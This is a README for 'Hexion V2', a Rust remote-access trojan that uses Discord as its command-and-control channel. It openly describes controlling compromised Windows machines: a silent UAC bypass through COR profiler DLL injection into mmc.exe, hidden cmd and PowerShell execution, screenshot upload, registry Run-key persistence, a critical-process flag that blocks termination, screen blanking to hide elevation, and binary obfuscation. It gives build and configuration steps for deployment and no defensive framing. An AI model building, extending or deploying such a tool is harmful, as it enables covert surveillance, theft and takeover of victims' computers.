# Hexion V2

Rust-based Discord command & control (C2) bot with UAC bypass, multi-session management, and stealth features.

## Overview

Hexion V2 is a lightweight C2 agent that connects to Discord for remote command execution. Each compromised machine gets its own session channel with isolated command namespace. The binary is heavily obfuscated and includes a silent UAC elevation method.

## Features

- **Silent UAC Bypass**: Method 39 elevation using eventvwr.msc + profiler DLL injection
- **Multi-Session Support**: One Discord channel per machine (`Desktop-[USERNAME]-[4-DIGIT]`), commands isolated per session
- **Session Locking**: User can lock a session to themselves with `!test`, preventing other users from sending commands
- **Command Execution**: Hidden cmd.exe and PowerShell command execution with output relay
- **Screenshot Capture**: JPEG-compressed screenshots from all monitors
- **System Information**: IP address, admin status, executable path
- **Persistence**: Auto-startup via HKCU registry with auto-check on !start-check
- **Critical Process**: Protected against termination (disarmed on !exit)
- **Screen Control**: Monitors turn off during elevation, turn back on after (complete stealth)
- **Binary Obfuscation**: Aggressive LTO, symbol stripping, panic abort, no debug info

## Building

### Requirements

- Rust 1.70+
- Windows 10/11
- profiler DLL (`hexion_prof.dll`) in project root

### Build

```bash
cargo build --release
```

Output: `target/release/Hexion.exe` (~4.8 MB obfuscated)

## Commands

All commands use `!` prefix. Commands only work in the machine's assigned session channel.

| Command | Usage | Effect |
|---------|-------|--------|
| `!help` | `!help` | List all commands |
| `!ss` | `!ss` | Screenshot all monitors (ultra-compressed JPEG), upload to Discord |
| `!info` | `!info` | Get IP, admin status, executable path |
| `!admin` | `!admin` | Test admin privileges (PowerShell check) |
| `!cmd <command>` | `!cmd ipconfig` | Execute cmd.exe command hidden, return output |
| `!powershell <command>` | `!powershell Get-Process` | Execute PowerShell command hidden, return output |
| `!test` | `!test` | Toggle session lock (first call locks to user, second call unlocks) |
| `!start-check` | `!start-check` | Check/add auto-startup registry entry |
| `!exit` | `!exit` | Terminate bot (disarms critical process flag first) |

## Startup Flow

1. Binary launches (medium integrity)
2. Spawns elevation in blocking call (no background thread)
3. If elevation succeeds → exits
4. If elevation fails → continues as medium-integrity bot
5. Elevated copy connects to Discord as single instance (mutex-protected)

## Elevation Mechanism

Uses **Method 39** (COR profiler injection):

1. Deploy `hexion_prof.dll` to `%TEMP%`
2. Set `COR_*` environment variables pointing to DLL
3. Launch `mmc.exe eventvwr.msc` with `"runas"` verb (explicit UAC elevation)
4. Monitors turn off (black screen)
5. CLR inside mmc.exe loads profiler DLL at high integrity
6. DLL spawns elevated Hexion copy with `--elevated` flag
7. Elevated copy signals back via named event
8. Original process terminates
9. Monitors turn back on
10. Elevated copy connects to Discord

## Session Management

Each Discord server must have a `DESKTOPS` category. When Hexion connects:

1. Creates channel `Desktop-[PCuserNAME]-[4 random digits]`
2. Channel assigned unique session ID
3. Commands in channel only affect that machine
4. User lock prevents other users from issuing commands in that session
5. `!test` toggles lock: first call locks to current user, second call unlocks

## Persistence

- Auto-adds self to `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `!start-check` verifies and re-adds if missing
- Points to original launcher path (tracked in data directory)

## Security Features

- **Critical Process Flag**: Process cannot be terminated without kernel-level operations (set on elevation, disarmed on !exit)
- **Command Execution Hiding**: All cmd/PowerShell execution uses `CREATE_NO_WINDOW` flag (0x08000000)
- **No Console Window**: `#![windows_subsystem = "windows"]` removes debug console
- **Binary Obfuscation**: Fat LTO, single codegen unit, symbol stripping, panic=abort
- **DLL Payload**: Embedded and deployed from memory

## Configuration

### Discord Token

Token is hardcoded in `src/main.rs`. Update before building:

```rust
let token = "YOUR_TOKEN_HERE";
```

### Allowed Test Users

Edit `ALLOWED_TEST_USERS` in `src/main.rs` to restrict `!test` command:

```rust
const ALLOWED_TEST_USERS: &[u64] = &[1275829256106279006];
```

## Architecture

- **src/main.rs**: Main bot logic, command handler, session manager
- **hexion_prof.dll**: Profiler DLL that injects elevated payload (embedded as `include_bytes!`)
- **Cargo.toml**: Release profile with aggressive optimization flags

## Release Profile

```toml
[profile.release]
opt-level = "z"        # Optimize for size
lto = "fat"            # Fat link-time optimization
codegen-units = 1      # Single codegen unit (slower build, better optimization)
strip = true           # Strip symbols
panic = "abort"        # Smaller panic handler
overflow-checks = false
debug = false
```

## Notes

- Build time: ~1m 15s (fat LTO is slow)
- Screenshot compression: 75% resolution scale, JPEG quality 50
- Monitor control: ~300ms delay after turning off (UAC window time)
- Session timeout: No built-in timeout, manual !exit required
- Single instance per machine (mutex-protected)

